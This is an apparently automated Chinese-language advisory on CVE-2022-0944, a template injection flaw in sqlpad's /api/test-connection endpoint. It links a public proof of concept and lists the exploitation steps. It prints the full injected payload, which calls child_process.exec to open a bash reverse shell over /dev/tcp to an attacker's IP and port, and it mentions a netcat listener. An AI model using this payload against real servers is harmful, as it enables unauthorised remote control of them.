## CVE-2022-0944-sqlpad-模板注入RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致远程代码执行

**影响应用:** sqlpad

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户才能利用，需要目标应用开放api/test-connection接口

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-0944是sqlpad 6.10.1之前版本中存在的一个模板注入漏洞，位于/api/test-connection端点。具有足够权限的攻击者可以通过向该端点发送恶意构造的请求，在服务器上执行任意代码。漏洞利用方式是，通过POST请求向/api/test-connection发送包含恶意模板代码的JSON数据。该模板代码利用`process.mainModule.require('child_process').exec()`来执行系统命令，并通过反弹shell的方式获取服务器的控制权。提供的POC代码经过分析是有效的。投毒风险较低，因为该代码直接使用了反弹shell，没有发现隐藏的恶意代码，主要风险在于使用者可能会在未经授权的情况下使用该代码，但从代码本身来看，恶意投毒可能性低。

**利用方式：**

1.  **漏洞点：** `/api/test-connection` 接口的模板注入
2.  **前提条件：**
    *   目标SQLPad版本低于 6.10.1
    *   攻击者需要具备高权限访问`/api/test-connection`接口。
    *   目标服务器能够访问攻击者的Netcat监听端口。
3.  **利用步骤：**
    *   攻击者首先需要设置一个Netcat监听器（例如：`nc -lvnp 4444`）。
    *   攻击者使用提供的Python脚本，指定目标SQLPad的URL、攻击者的IP地址和监听端口。
    *   脚本构造包含恶意代码的JSON数据，并将其POST到`/api/test-connection`接口。
    *   恶意代码利用模板引擎执行系统命令，反弹shell到攻击者的监听器。
4.  **Payload分析：**
    *   `{{ process.mainModule.require('child_process').exec('/bin/bash -c "bash -i >& /dev/tcp/{args.attacker_ip}/{args.attacker_port} 0>&1"') }}`
    *   这段代码使用Node.js的`child_process.exec`来执行系统命令。
    *   `/bin/bash -c "bash -i >& /dev/tcp/{args.attacker_ip}/{args.attacker_port} 0>&1"` 是一个反弹shell命令，它会连接到攻击者的IP地址和端口，并将shell重定向到该连接。

**项目地址:** [0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)